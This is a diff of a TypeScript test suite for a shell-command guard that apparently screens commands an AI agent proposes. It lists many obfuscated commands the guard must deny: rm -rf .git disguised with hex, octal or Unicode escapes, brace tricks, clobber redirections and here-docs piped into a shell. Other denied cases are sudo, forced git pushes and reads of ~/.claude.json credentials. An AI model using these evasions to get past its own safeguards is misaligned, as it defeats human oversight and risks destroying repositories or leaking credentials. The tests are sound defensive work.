-    ['a hex escape that spells --', "rm -rf -$'\\x2d' -d/../.git"],
-    ['a hex escape inside a path', "rm -rf dist/$'\\x2e'git"],
-    ['a hex escape that spells the command', "$'\\x72m' -rf .git"],
-  ])('denies %s for the .git it decodes to', (_name, command) => {
-    expect(run(command)).toEqual({
-      decision: 'deny',
-      reason: 'rm -r of a .git path is never allowed.',
-    });
+  it('denies an ANSI-C escape for the .git it decodes to', () => {
+    const rows: [string, string][] = [
+      ['a hex escape that spells .git', "rm -rf $'\\x2egit'"],
+      ['an octal escape that spells .git', "rm -rf $'\\056git'"],
+      ['a Unicode escape that spells .git', "rm -rf $'\\u002egit'"],
+      ['hex escapes for every letter of .git', "rm -rf $'\\x2e\\x67\\x69\\x74'"],
+      ['a hex escape that spells the flags', "rm $'\\x2drf' .git"],
+      ['a hex escape inside the flags', "rm -$'\\x72'f .git"],
+      ['a hex escape that spells --', "rm -rf -$'\\x2d' -d/../.git"],
+      ['a hex escape inside a path', "rm -rf dist/$'\\x2e'git"],
+      ['a hex escape that spells the command', "$'\\x72m' -rf .git"],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual({
+        decision: 'deny',
+        reason: 'rm -r of a .git path is never allowed.',
+      });
+    }
   });
 
-  it.each([
-    ['an unknown escape', "echo $'\\q'"],
-    ['a decoded NUL', "echo $'\\x00'"],
-    ['a control escape that decodes to NUL', "echo $'\\c@'"],
-    ['a hex escape with no digits', "echo $'\\x'"],
-    ['an octal escape past one byte', "echo $'\\777'"],
-    ['a Unicode escape with no digits', "echo $'\\u'"],
-    ['a decoded / inside a word', "rm -rf $'dist\\x2f.git'"],
-    ['a decoded newline inside a word', "printf $'a\\nb'"],
-    ['an unclosed ANSI-C quote', "rm -rf $'.git"],
-    ['a lone { before .git', 'rm -rf { .git'],
-    ['a lone } before .git', 'rm -rf } .git'],
-    ['a lone } between arguments', 'rm -rf build } .git'],
-    ['a lone } after --', 'rm -rf -- } .git'],
-    ['a lone { after --', 'rm -rf -- { .git'],
-    ['a lone { inside an if', 'if true; then rm -rf { .git; fi'],
-    ['a zsh short if whose group closes without ;', 'if true { rm -rf .git }'],
-    ['a zsh short if whose group closes after ;', 'if true { rm -rf .git; }'],
-    ['a lone { before a force flag', 'git push { --force'],
-    ['a control escape before a force flag', "git push origin feat --for$'\\ce'"],
-    ['a control escape inside the sign-in path', "cat ~/.$'\\cl'aude.json"],
-    ['a control escape in a cp source', "cp ~/.$'\\cl'aude.json x"],
-    ['a bare control escape', "echo $'\\cA'"],
-    ['a two-byte hex escape above 0x7f', "cat jose$'\\xc3\\xa9'/.git"],
-    ['a two-byte octal escape above 0x7f', "cat jose$'\\303\\251'/.git"],
-    ['an octal byte of 0x80', "echo $'\\200'"],
-    ['a zsh clobber before rm', '>! x rm -rf .git'],
-    ['a zsh append clobber before sudo', '>>! x sudo ls'],
-    ['a zsh both-streams clobber before sudo', '&>! x sudo ls'],
-    ['a zsh descriptor clobber before sudo', '2>! x sudo ls'],
-    ['a zsh pipe clobber before rm', '>| x rm -rf .git'],
-    ['a zsh pipe clobber joined before git', '>|x git push origin feat --force'],
-    ['a zsh pipe clobber inside a git push', 'git push origin feat >|x --force'],
-    ['a zsh pipe clobber before a double dash', 'rm -rf >| -- .git'],
-    ['a named descriptor before rm', '{fd}>x rm -rf .git'],
-    ['a named descriptor before git', '{fd}<x git push --force'],
-    ['a brace joined to rm', '{rm -rf .git}'],
-    ['a brace joined to git', '{git push origin feat -f}'],
-    ['a brace joined to sudo', '{sudo ls}'],
-    ['a brace group that reads the sign-in', '{cat ~/.claude.json}'],
-    ['a brace group opened as a word', '{ cat ~/.claude.json}'],
-    ['a brace group after a command', '{ rm -rf build; cat ~/.claude.json}'],
-    ['an ampersand clobber before rm', '>&| x rm -rf .git'],
-    ['an ampersand clobber before sudo', '>&! x sudo ls'],
-    ['a doubled ampersand clobber', '>>&| x sudo ls'],
-    ['a doubled ampersand bang clobber', '>>&! x sudo ls'],
-    ['an ampersand-first append clobber', '&>>| x sudo ls'],
-    ['a descriptor ampersand clobber', '2>&| x sudo ls'],
-    ['an ampersand clobber inside a git push', 'git push origin feat >&| x --force'],
-    ['an ampersand bang clobber joined to the target', 'git push origin feat >&!x --force'],
-    ['a brace expansion that opens a group', '{ cat ~/.claude.json{,}}'],
-    ['a brace expansion inside a joined group', '{env{,} rm -rf .git}'],
-    ['a group whose close is a here-doc delimiter line', '{\ncat ~/.claude.json}'],
-    ['a shell here-doc body with a joined brace', "/bin/bash <<'EOF'\n{rm -rf .git}\nEOF"],
-    ['a here-doc fed through a wrapper to bash', "env bash <<'EOF'\n{rm -rf .git}\nEOF"],
-    ['a here-doc piped into a shell', "cat <<'EOF' | tee x | sh\n{rm -rf .git}\nEOF"],
-    ['a data here-doc piped into a shell', "python3 - <<'EOF' | sh\n{rm -rf .git}\nEOF"],
-    ['a tee here-doc into a process substitution', "tee >(sh) <<'EOF'\n{rm -rf .git}\nEOF"],
-    [
-      'a tee here-doc with a process substitution after it',
-      "tee x <<'EOF' >(sh)\n{rm -rf .git}\nEOF",
-    ],
-    [
-      'a cat here-doc redirected to a process substitution',
-      "cat <<'EOF' > >(sh)\n{rm -rf .git}\nEOF",
-    ],
-    ['a here-doc in a brace group piped into a shell', "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} | sh"],
-    ['a here-doc in a subshell piped into a shell', "( cat <<'EOF'\n{rm -rf .git}\nEOF\n) | sh"],
-    [
-      'a here-doc in a command substitution that eval runs',
-      'eval "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
-    ],
-    [
-      'a here-doc in an if whose fi is redirected to a process substitution',
-      "if true; then cat <<'EOF'\n{rm -rf .git}\nEOF\nfi > >(zsh)",
-    ],
-    [
-      'a here-doc in a for whose done is redirected to a process substitution',
-      "while false; do :; done; for i in 1; do tee <<'EOF'\n{rm -rf .git}\nEOF\ndone > >(zsh)",
-    ],
-    [
-      'a here-doc in a for whose done is piped',
-      "for i in 1; do cat <<'EOF'\n{rm -rf .git}\nEOF\ndone | zsh",
-    ],
-    [
-      'a here-doc in an if whose fi is piped',
-      "if true; then cat <<'EOF'\n{rm -rf .git}\nEOF\nfi | zsh",
-    ],
-    [
-      'a here-doc after an earlier process substitution',
-      "true > >(zsh); cat <<'EOF'\n{rm -rf .git}\nEOF",
-    ],
-    ['a here-doc after a coproc', "coproc zsh; cat <<'EOF'\n{rm -rf .git}\nEOF"],
-    [
-      'a here-doc in a group piped after a line continuation',
-      "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} \\\n| zsh",
-    ],
-    [
-      'a here-doc in a group piped after a redirection and a newline',
-      "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} 2>/dev/null |\nzsh",
-    ],
-    [
-      'a here-doc in a command substitution that sh -c runs',
-      'sh -c "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
-    ],
-    [
-      'a here-doc in a command substitution piped into a shell',
-      'echo "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)" | zsh',
-    ],
-    ['a zero-padded sequence, which only zsh pads', 'echo {01..10}'],
-    ['a stepped sequence, which bash 3.2 keeps literal', 'echo {1..5..2}'],
-    ['a psql here-doc, whose meta-commands run shell', "psql <<'EOF'\n{rm -rf .git}\nEOF"],
-    [
-      'a sqlite3 here-doc, whose meta-commands run shell',
-      "sqlite3 x.db <<'EOF'\n{rm -rf .git}\nEOF",
-    ],
-    ['a sequence past the sequence cap', 'echo {1..5000}'],
-    ['a sequence that yields option words', 'rm {-5..-1}'],
-    [
-      'a substitution in a here-doc that zsh reads',
-      "zsh <<EOF\n: $(cat <<'X'\n\n{rm -rf .git}\nX\n)\nEOF",
-    ],
-    [
-      'a substitution in a here-doc that source reads',
-      "source /dev/stdin <<EOF\n: $(cat <<'X'\n\n{rm -rf .git}\nX\n)\nEOF",
-    ],
-    [
-      'a substitution in an argument that watch runs',
-      'watch -n1 "$(cat <<\'X\'\n{rm -rf .git}\nX\n)"',
-    ],
-    [
-      'an eval here-doc redirected to a process substitution',
-      'eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF" > >(sh)',
-    ],
-    [
-      'an eval here-doc in a group redirected to a process substitution',
-      '{ eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF"; } > >(sh)',
-    ],
-    [
-      'an eval here-doc after an earlier process substitution',
-      'true > >(sh); eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF"',
-    ],
-    ['an eval here-doc piped onward', 'eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF" | dash'],
-    [
-      'a bash -c here-doc after an earlier process substitution',
-      'true > >(sh); bash -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF"',
-    ],
-    [
-      'a zsh -c here-doc redirected to a process substitution',
-      'zsh -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF" > >(sh)',
-    ],
-    [
-      'a find -exec sh -c here-doc after an earlier process substitution',
-      'true > >(sh); find . -exec sh -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF" \\;',
-    ],
-  ])('denies %s as words the guard cannot read', (_name, command) => {
-    expect(run(command)).toEqual(unread);
-  });
-
-  it.each([
-    ['a brace list splitting env', 'env{,} rm -rf .git'],
-    ['a brace list splitting nice', '{nice,} rm -rf .git'],
-    ['a brace list splitting env before sudo', 'env{,} sudo ls'],
-    ['a brace list with a quoted brace after env', "env {rm,-rf,.git,'{'}"],
-    ['a brace list with an escaped comma after nice', 'nice {rm,-rf,.git,\\,}'],
-    ['a brace list with a quoted comma before sudo', "env {sudo,ls,'x,'}"],
-    ['a brace list splitting sudo beside an astral character', 'env {sudo,ls,😀}'],
-    ['a brace list splitting rm beside an astral character', 'env {rm,-rf,.git,😀}'],
-  ])('denies %s, which brace expansion reveals', (_name, command) => {
-    expect(run(command).decision).toBe('deny');
-  });
-
-  it.each([
-    [
-      'a here-doc in a command substitution run as the command',
-      '"$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
-    ],
-    [
-      'a here-doc after an exec to a process substitution',
-      "exec 3> >(zsh); cat <<'EOF' >&3\n{rm -rf .git}\nEOF",
-    ],
-  ])('denies %s', (_name, command) => {
-    expect(run(command).decision).toBe('deny');
-  });
-
-  it.each([
-    [
-      'a tee here-doc into a process substitution',
-      "tee >(sh) <<'EOF'\nrm -rf .git\nEOF",
-      'rm -r of a .git path is never allowed.',
-    ],
-    [
-      'a tee here-doc with a process substitution after it',
-      "tee x <<'EOF' >(sh)\nrm -rf .git\nEOF",
-      'rm -r of a .git path is never allowed.',
-    ],
-    [
-      'a cat here-doc redirected to a process substitution',
-      "cat <<'EOF' > >(sh)\nrm -rf .git\nEOF",
-      'rm -r of a .git path is never allowed.',
-    ],
-    [
-      'a python here-doc that runs its input',
-      "python3 -c 'import sys; exec(sys.stdin.read())' <<'EOF'\nsudo ls\nEOF",
-      'sudo is never allowed.',
-    ],
-    [
-      'a cat here-doc written to a script that then runs',
-      "cat <<'EOF' > x.sh && sh x.sh\nrm -rf .git\nEOF",
-      'rm -r of a .git path is never allowed.',
-    ],
-  ])('denies %s: a here-document body is always judged as shell', (_name, command, reason) => {
-    expect(run(command)).toEqual({ decision: 'deny', reason });
-  });
-
-  // A substitution's output may reach a shell the guard does not see (`watch`, a here-document a
-  // shell reads), so a here-document inside one is never data: brace data there is refused.
-  it.each([
-    'curl -s -X POST localhost:3000/api -d "$(cat <<\'EOF\'\n{ "name": "x" }\nEOF\n)"',
-    'node -e "$(cat <<\'EOF\'\nconst x = { a: 1 };\nconsole.log(x);\nEOF\n)"',
-    'jq -n --argjson x "$(cat <<\'EOF\'\n{ "a": 1 }\nEOF\n)" \'$x\'',
-  ])('denies brace data in a here-doc inside a substitution: %s', (command) => {
-    expect(run(command)).toEqual(unread);
-  });
-
-  it.each(['echo {1..300000000}', 'echo {1..99999999999}'])(
-    'denies %s quickly, without expanding the sequence',
-    (command) => {
+  it('denies words the guard cannot read: escapes, lone braces, clobbers and shell here-docs', () => {
+    const rows: [string, string][] = [
+      ['an unknown escape', "echo $'\\q'"],
+      ['a decoded NUL', "echo $'\\x00'"],
+      ['a control escape that decodes to NUL', "echo $'\\c@'"],
+      ['a hex escape with no digits', "echo $'\\x'"],
+      ['an octal escape past one byte', "echo $'\\777'"],
+      ['a Unicode escape with no digits', "echo $'\\u'"],
+      ['a decoded / inside a word', "rm -rf $'dist\\x2f.git'"],
+      ['a decoded newline inside a word', "printf $'a\\nb'"],
+      ['an unclosed ANSI-C quote', "rm -rf $'.git"],
+      ['a lone { before .git', 'rm -rf { .git'],
+      ['a lone } before .git', 'rm -rf } .git'],
+      ['a lone } between arguments', 'rm -rf build } .git'],
+      ['a lone } after --', 'rm -rf -- } .git'],
+      ['a lone { after --', 'rm -rf -- { .git'],
+      ['a lone { inside an if', 'if true; then rm -rf { .git; fi'],
+      ['a zsh short if whose group closes without ;', 'if true { rm -rf .git }'],
+      ['a zsh short if whose group closes after ;', 'if true { rm -rf .git; }'],
+      ['a lone { before a force flag', 'git push { --force'],
+      ['a control escape before a force flag', "git push origin feat --for$'\\ce'"],
+      ['a control escape inside the sign-in path', "cat ~/.$'\\cl'aude.json"],
+      ['a control escape in a cp source', "cp ~/.$'\\cl'aude.json x"],
+      ['a bare control escape', "echo $'\\cA'"],
+      ['a two-byte hex escape above 0x7f', "cat jose$'\\xc3\\xa9'/.git"],
+      ['a two-byte octal escape above 0x7f', "cat jose$'\\303\\251'/.git"],
+      ['an octal byte of 0x80', "echo $'\\200'"],
+      ['a zsh clobber before rm', '>! x rm -rf .git'],
+      ['a zsh append clobber before sudo', '>>! x sudo ls'],
+      ['a zsh both-streams clobber before sudo', '&>! x sudo ls'],
+      ['a zsh descriptor clobber before sudo', '2>! x sudo ls'],
+      ['a zsh pipe clobber before rm', '>| x rm -rf .git'],
+      ['a zsh pipe clobber joined before git', '>|x git push origin feat --force'],
+      ['a zsh pipe clobber inside a git push', 'git push origin feat >|x --force'],
+      ['a zsh pipe clobber before a double dash', 'rm -rf >| -- .git'],
+      ['a named descriptor before rm', '{fd}>x rm -rf .git'],
+      ['a named descriptor before git', '{fd}<x git push --force'],
+      ['a brace joined to rm', '{rm -rf .git}'],
+      ['a brace joined to git', '{git push origin feat -f}'],
+      ['a brace joined to sudo', '{sudo ls}'],
+      ['a brace group that reads the sign-in', '{cat ~/.claude.json}'],
+      ['a brace group opened as a word', '{ cat ~/.claude.json}'],
+      ['a brace group after a command', '{ rm -rf build; cat ~/.claude.json}'],
+      ['an ampersand clobber before rm', '>&| x rm -rf .git'],
+      ['an ampersand clobber before sudo', '>&! x sudo ls'],
+      ['a doubled ampersand clobber', '>>&| x sudo ls'],
+      ['a doubled ampersand bang clobber', '>>&! x sudo ls'],
+      ['an ampersand-first append clobber', '&>>| x sudo ls'],
+      ['a descriptor ampersand clobber', '2>&| x sudo ls'],
+      ['an ampersand clobber inside a git push', 'git push origin feat >&| x --force'],
+      ['an ampersand bang clobber joined to the target', 'git push origin feat >&!x --force'],
+      ['a brace expansion that opens a group', '{ cat ~/.claude.json{,}}'],
+      ['a brace expansion inside a joined group', '{env{,} rm -rf .git}'],
+      ['a group whose close is a here-doc delimiter line', '{\ncat ~/.claude.json}'],
+      ['a shell here-doc body with a joined brace', "/bin/bash <<'EOF'\n{rm -rf .git}\nEOF"],
+      ['a here-doc fed through a wrapper to bash', "env bash <<'EOF'\n{rm -rf .git}\nEOF"],
+      ['a here-doc piped into a shell', "cat <<'EOF' | tee x | sh\n{rm -rf .git}\nEOF"],
+      ['a data here-doc piped into a shell', "python3 - <<'EOF' | sh\n{rm -rf .git}\nEOF"],
+      ['a tee here-doc into a process substitution', "tee >(sh) <<'EOF'\n{rm -rf .git}\nEOF"],
+      [
+        'a tee here-doc with a process substitution after it',
+        "tee x <<'EOF' >(sh)\n{rm -rf .git}\nEOF",
+      ],
+      [
+        'a cat here-doc redirected to a process substitution',
+        "cat <<'EOF' > >(sh)\n{rm -rf .git}\nEOF",
+      ],
+      [
+        'a here-doc in a brace group piped into a shell',
+        "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} | sh",
+      ],
+      ['a here-doc in a subshell piped into a shell', "( cat <<'EOF'\n{rm -rf .git}\nEOF\n) | sh"],
+      [
+        'a here-doc in a command substitution that eval runs',
+        'eval "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
+      ],
+      [
+        'a here-doc in an if whose fi is redirected to a process substitution',
+        "if true; then cat <<'EOF'\n{rm -rf .git}\nEOF\nfi > >(zsh)",
+      ],
+      [
+        'a here-doc in a for whose done is redirected to a process substitution',
+        "while false; do :; done; for i in 1; do tee <<'EOF'\n{rm -rf .git}\nEOF\ndone > >(zsh)",
+      ],
+      [
+        'a here-doc in a for whose done is piped',
+        "for i in 1; do cat <<'EOF'\n{rm -rf .git}\nEOF\ndone | zsh",
+      ],
+      [
+        'a here-doc in an if whose fi is piped',
+        "if true; then cat <<'EOF'\n{rm -rf .git}\nEOF\nfi | zsh",
+      ],
+      [
+        'a here-doc after an earlier process substitution',
+        "true > >(zsh); cat <<'EOF'\n{rm -rf .git}\nEOF",
+      ],
+      ['a here-doc after a coproc', "coproc zsh; cat <<'EOF'\n{rm -rf .git}\nEOF"],
+      [
+        'a here-doc in a group piped after a line continuation',
+        "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} \\\n| zsh",
+      ],
+      [
+        'a here-doc in a group piped after a redirection and a newline',
+        "{ cat <<'EOF'\n{rm -rf .git}\nEOF\n} 2>/dev/null |\nzsh",
+      ],
+      [
+        'a here-doc in a command substitution that sh -c runs',
+        'sh -c "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
+      ],
+      [
+        'a here-doc in a command substitution piped into a shell',
+        'echo "$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)" | zsh',
+      ],
+      ['a zero-padded sequence, which only zsh pads', 'echo {01..10}'],
+      ['a stepped sequence, which bash 3.2 keeps literal', 'echo {1..5..2}'],
+      ['a psql here-doc, whose meta-commands run shell', "psql <<'EOF'\n{rm -rf .git}\nEOF"],
+      [
+        'a sqlite3 here-doc, whose meta-commands run shell',
+        "sqlite3 x.db <<'EOF'\n{rm -rf .git}\nEOF",
+      ],
+      ['a sequence past the sequence cap', 'echo {1..5000}'],
+      ['a sequence that yields option words', 'rm {-5..-1}'],
+      [
+        'a substitution in a here-doc that zsh reads',
+        "zsh <<EOF\n: $(cat <<'X'\n\n{rm -rf .git}\nX\n)\nEOF",
+      ],
+      [
+        'a substitution in a here-doc that source reads',
+        "source /dev/stdin <<EOF\n: $(cat <<'X'\n\n{rm -rf .git}\nX\n)\nEOF",
+      ],
+      [
+        'a substitution in an argument that watch runs',
+        'watch -n1 "$(cat <<\'X\'\n{rm -rf .git}\nX\n)"',
+      ],
+      [
+        'an eval here-doc redirected to a process substitution',
+        'eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF" > >(sh)',
+      ],
+      [
+        'an eval here-doc in a group redirected to a process substitution',
+        '{ eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF"; } > >(sh)',
+      ],
+      [
+        'an eval here-doc after an earlier process substitution',
+        'true > >(sh); eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF"',
+      ],
+      ['an eval here-doc piped onward', 'eval "cat <<\'EOF\'\n{rm -rf .git}\nEOF" | dash'],
+      [
+        'a bash -c here-doc after an earlier process substitution',
+        'true > >(sh); bash -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF"',
+      ],
+      [
+        'a zsh -c here-doc redirected to a process substitution',
+        'zsh -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF" > >(sh)',
+      ],
+      [
+        'a find -exec sh -c here-doc after an earlier process substitution',
+        'true > >(sh); find . -exec sh -c "cat <<\'EOF\'\n{rm -rf .git}\nEOF" \\;',
+      ],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${JSON.stringify(command)}`).toEqual(unread);
+    }
+    // A substitution's output may reach a shell the guard does not see (`watch`, a here-document a
+    // shell reads), so a here-document inside one is never data: brace data there is refused.
+    for (const command of [
+      'curl -s -X POST localhost:3000/api -d "$(cat <<\'EOF\'\n{ "name": "x" }\nEOF\n)"',
+      'node -e "$(cat <<\'EOF\'\nconst x = { a: 1 };\nconsole.log(x);\nEOF\n)"',
+      'jq -n --argjson x "$(cat <<\'EOF\'\n{ "a": 1 }\nEOF\n)" \'$x\'',
+    ]) {
+      expect.soft(run(command), JSON.stringify(command)).toEqual(unread);
+    }
+    // A huge sequence is refused quickly, without expanding it.
+    for (const command of ['echo {1..300000000}', 'echo {1..99999999999}']) {
       const started = performance.now();
-      expect(run(command)).toEqual(unread);
-      expect(performance.now() - started).toBeLessThan(100);
-    },
-  );
+      expect.soft(run(command), command).toEqual(unread);
+      expect.soft(performance.now() - started, command).toBeLessThan(100);
+    }
+  });
 
-  it.each([
-    ['a redirection before rm', '2>/dev/null rm -rf .git'],
-    ['a bare redirection whose target looks like an option', '> -x rm -rf .git'],
-    ['a redirection after an assignment', 'X=1 >x rm -rf .git'],
-    ['an input redirection before rm', '<x rm -rf ../out'],
-  ])('denies rm -r with %s as unjudged syntax', (_name, command) => {
-    expect(run(command)).toEqual(unjudged);
+  it('denies what brace expansion reveals and a here-doc run as or fed to a command', () => {
+    const rows: [string, string][] = [
+      ['a brace list splitting env', 'env{,} rm -rf .git'],
+      ['a brace list splitting nice', '{nice,} rm -rf .git'],
+      ['a brace list splitting env before sudo', 'env{,} sudo ls'],
+      ['a brace list with a quoted brace after env', "env {rm,-rf,.git,'{'}"],
+      ['a brace list with an escaped comma after nice', 'nice {rm,-rf,.git,\\,}'],
+      ['a brace list with a quoted comma before sudo', "env {sudo,ls,'x,'}"],
+      ['a brace list splitting sudo beside an astral character', 'env {sudo,ls,😀}'],
+      ['a brace list splitting rm beside an astral character', 'env {rm,-rf,.git,😀}'],
+      [
+        'a here-doc in a command substitution run as the command',
+        '"$(cat <<\'EOF\'\n{rm -rf .git}\nEOF\n)"',
+      ],
+      [
+        'a here-doc after an exec to a process substitution',
+        "exec 3> >(zsh); cat <<'EOF' >&3\n{rm -rf .git}\nEOF",
+      ],
+    ];
+    for (const [name, command] of rows) expect.soft(run(command).decision, name).toBe('deny');
+  });
+
+  it('judges a here-document body as shell, always', () => {
+    const rows: [string, string, string][] = [
+      [
+        'a tee here-doc into a process substitution',
+        "tee >(sh) <<'EOF'\nrm -rf .git\nEOF",
+        'rm -r of a .git path is never allowed.',
+      ],
+      [
+        'a tee here-doc with a process substitution after it',
+        "tee x <<'EOF' >(sh)\nrm -rf .git\nEOF",
+        'rm -r of a .git path is never allowed.',
+      ],
+      [
+        'a cat here-doc redirected to a process substitution',
+        "cat <<'EOF' > >(sh)\nrm -rf .git\nEOF",
+        'rm -r of a .git path is never allowed.',
+      ],
+      [
+        'a python here-doc that runs its input',
+        "python3 -c 'import sys; exec(sys.stdin.read())' <<'EOF'\nsudo ls\nEOF",
+        'sudo is never allowed.',
+      ],
+      [
+        'a cat here-doc written to a script that then runs',
+        "cat <<'EOF' > x.sh && sh x.sh\nrm -rf .git\nEOF",
+        'rm -r of a .git path is never allowed.',
+      ],
+    ];
+    for (const [name, command, reason] of rows) {
+      expect.soft(run(command), name).toEqual({ decision: 'deny', reason });
+    }
+  });
+
+  it('denies rm -r after a redirection before the command as unjudged syntax', () => {
+    const rows: [string, string][] = [
+      ['a redirection before rm', '2>/dev/null rm -rf .git'],
+      ['a bare redirection whose target looks like an option', '> -x rm -rf .git'],
+      ['a redirection after an assignment', 'X=1 >x rm -rf .git'],
+      ['an input redirection before rm', '<x rm -rf ../out'],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual(unjudged);
+    }
   });
 
   const hiddenByRedirection = {
@@ -1374,78 +1431,89 @@ describe('rm -r arguments beyond a plain path', () => {
       "A redirection among a wrapper's words, or one the guard does not recognize, hides which command runs. Put redirections after the command.",
   };
 
-  it.each([
-    ['a redirection after env', 'env >x rm -rf .git'],
-    ['a redirection after nice', 'nice 2>x rm -rf .git'],
-    ['a redirection between env flags', 'env -i >x -u X rm -rf .git'],
-    ["a redirection in place of env -u's value", 'env -u >x FOO rm -rf .git'],
-    ["a redirection in place of nice -n's value", 'nice -n >x 5 rm -rf .git'],
-    ["a redirection before timeout's duration", 'timeout >x 5 rm -rf .git'],
-    ['a redirection joined to the command name', 'a>b rm -rf .git'],
-  ])('denies %s as a redirection that hides the command', (_name, command) => {
-    expect(run(command)).toEqual(hiddenByRedirection);
+  it("denies a redirection among a wrapper's words as one that hides the command", () => {
+    const rows: [string, string][] = [
+      ['a redirection after env', 'env >x rm -rf .git'],
+      ['a redirection after nice', 'nice 2>x rm -rf .git'],
+      ['a redirection between env flags', 'env -i >x -u X rm -rf .git'],
+      ["a redirection in place of env -u's value", 'env -u >x FOO rm -rf .git'],
+      ["a redirection in place of nice -n's value", 'nice -n >x 5 rm -rf .git'],
+      ["a redirection before timeout's duration", 'timeout >x 5 rm -rf .git'],
+      ['a redirection joined to the command name', 'a>b rm -rf .git'],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual(hiddenByRedirection);
+    }
   });
 
-  it.each([
-    ['a group opened after then', 'if true; then { rm -rf .git; }; fi'],
-    ['a group opened after time', 'time { rm -rf .git; }'],
-    ['a function body', 'function f { rm -rf .git; }'],
-  ])('judges the rm in %s as its own command', (_name, command) => {
-    expect(run(command)).toEqual({
-      decision: 'deny',
-      reason: 'rm -r of a .git path is never allowed.',
-    });
+  it('judges the rm in a group, after time or in a function body as its own command', () => {
+    const rows: [string, string][] = [
+      ['a group opened after then', 'if true; then { rm -rf .git; }; fi'],
+      ['a group opened after time', 'time { rm -rf .git; }'],
+      ['a function body', 'function f { rm -rf .git; }'],
+    ];
+    for (const [name, command] of rows) {
+      expect.soft(run(command), `${name}: ${command}`).toEqual({
+        decision: 'deny',
+        reason: 'rm -r of a .git path is never allowed.',
+      });
+    }
   });
 
-  it.each([
-    '{ rm -rf build; }',
-    '2>/dev/null git status',
-    '2>/dev/null env FOO=1 git status',
-    "echo $'it\\'s'",
-    "IFS=$'\\n' read -r x",
-    "printf $'a\\tb\\n'",
-    "grep $'\\t' file",
-    "echo $'\\e[1m\\?\\a'",
-    'git status | head',
-    'echo file.{ts,js}',
-    "git log --format='%h {x}'",
-    'find dist -name x -exec rm {} +',
-    'a >&2 | b',
-    'mkdir -p src/{a,b}',
-    'echo {1..3}',
-    'git show stash@{0}',
-    'xargs -I{} echo {}',
-    "cat <<'EOF'\n{ x\nEOF}\nEOF",
-    'cat <<EOF\n{\n}\nEOF',
-    "node <<'EOF'\nconsole.log({a: 1});\nEOF",
-    "python3 - <<'EOF'\nd = {'a': 1}\nprint(d)\nEOF",
-    'cat > a.json <<\'EOF\'\n{"a": 1}\nEOF',
-    'jq . <<\'EOF\'\n{"a":1}\nEOF',
-    "cat > a.ts <<'EOF'\nimport { x } from './y';\nEOF",
-    "tee a.md <<'EOF'\nSet {name} here.\nEOF",
-    "jq '{a: .b, c: .d}'",
-    "find . -name '*.{ts,tsx}'",
-    "git log --format='{%h,%s}'",
-    'for i in {1..100}; do echo $i; done',
-    'echo {a..z}',
-    'echo {0..3}',
-    'echo "$(cat <<\'EOF\'\n{\n}\nEOF\n)"',
-    '{ cat <<\'EOF\'\n{ "a": 1 }\nEOF\n} > out.json',
-    "( cat <<'EOF'\nconst x = { a: 1 };\nEOF\n) > a.ts",
-    "cat <<'EOF' > a.ts || echo failed\nconst x = { a: 1 };\nEOF",
-    "{ cat <<'EOF'\nconst x = { a: 1 };\nEOF\n} || true",
-    'echo ${HOME:-..}',
-    'cd ${DIR:-..}',
-    'ls ${x%..}',
-  ])('allows %s', (command) => {
-    expect(run(command)).toEqual({ decision: 'allow' });
+  it('allows braces, escapes and here-doc data the guard reads as plain', () => {
+    for (const command of [
+      '{ rm -rf build; }',
+      '2>/dev/null git status',
+      '2>/dev/null env FOO=1 git status',
+      "echo $'it\\'s'",
+      "IFS=$'\\n' read -r x",
+      "printf $'a\\tb\\n'",
+      "grep $'\\t' file",
+      "echo $'\\e[1m\\?\\a'",
+      'git status | head',
+      'echo file.{ts,js}',
+      "git log --format='%h {x}'",
+      'find dist -name x -exec rm {} +',
+      'a >&2 | b',
+      'mkdir -p src/{a,b}',
+      'echo {1..3}',
+      'git show stash@{0}',
+      'xargs -I{} echo {}',
+      "cat <<'EOF'\n{ x\nEOF}\nEOF",
+      'cat <<EOF\n{\n}\nEOF',
+      "node <<'EOF'\nconsole.log({a: 1});\nEOF",
+      "python3 - <<'EOF'\nd = {'a': 1}\nprint(d)\nEOF",
+      'cat > a.json <<\'EOF\'\n{"a": 1}\nEOF',
+      'jq . <<\'EOF\'\n{"a":1}\nEOF',
+      "cat > a.ts <<'EOF'\nimport { x } from './y';\nEOF",
+      "tee a.md <<'EOF'\nSet {name} here.\nEOF",
+      "jq '{a: .b, c: .d}'",
+      "find . -name '*.{ts,tsx}'",
+      "git log --format='{%h,%s}'",
+      'for i in {1..100}; do echo $i; done',
+      'echo {a..z}',
+      'echo {0..3}',
+      'echo "$(cat <<\'EOF\'\n{\n}\nEOF\n)"',
+      '{ cat <<\'EOF\'\n{ "a": 1 }\nEOF\n} > out.json',
+      "( cat <<'EOF'\nconst x = { a: 1 };\nEOF\n) > a.ts",
+      "cat <<'EOF' > a.ts || echo failed\nconst x = { a: 1 };\nEOF",
+      "{ cat <<'EOF'\nconst x = { a: 1 };\nEOF\n} || true",
+      'echo ${HOME:-..}',
+      'cd ${DIR:-..}',
+      'ls ${x%..}',
